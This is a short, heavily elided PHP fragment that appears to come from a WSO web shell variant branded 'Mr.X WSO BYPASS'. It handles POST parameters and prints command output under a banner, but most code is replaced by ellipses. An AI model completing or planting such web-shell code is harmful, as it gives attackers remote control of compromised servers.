...
if (@isset($_POST["a"])) {
    ...
    if (isset($_POST['subcmd'])) {
        ...
        echo "<center>Mr.X WSO BYPASS!</center>";
        echo "<br>";
        echo '$WSOMr_X: ';
        echo $output;
        echo "</pre>";
